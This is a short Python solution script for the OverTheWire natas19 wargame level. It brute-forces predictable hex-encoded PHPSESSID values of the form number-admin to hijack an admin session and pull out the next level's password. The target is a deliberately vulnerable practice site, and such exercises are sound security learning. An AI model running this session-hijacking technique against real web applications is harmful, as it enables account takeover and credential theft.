#!/usr/bin/env python3
import re
import requests


url = 'http://natas19.natas.labs.overthewire.org/'
auth = ('natas19', natas19_pass)

def find_password():
    for i in range(1,641):
        cookies = {'PHPSESSID': f'{i}-admin'.encode().hex()}
        r = requests.get(url, auth=auth, cookies=cookies)
        if 'Username: natas20' in r.text:
            password_re = re.compile('Password: (?P<password>[a-zA-Z0-9]{32})')
            password = password_re.search(r.text).groupdict()['password']
            return password


if __name__ == '__main__':
    print(find_password())
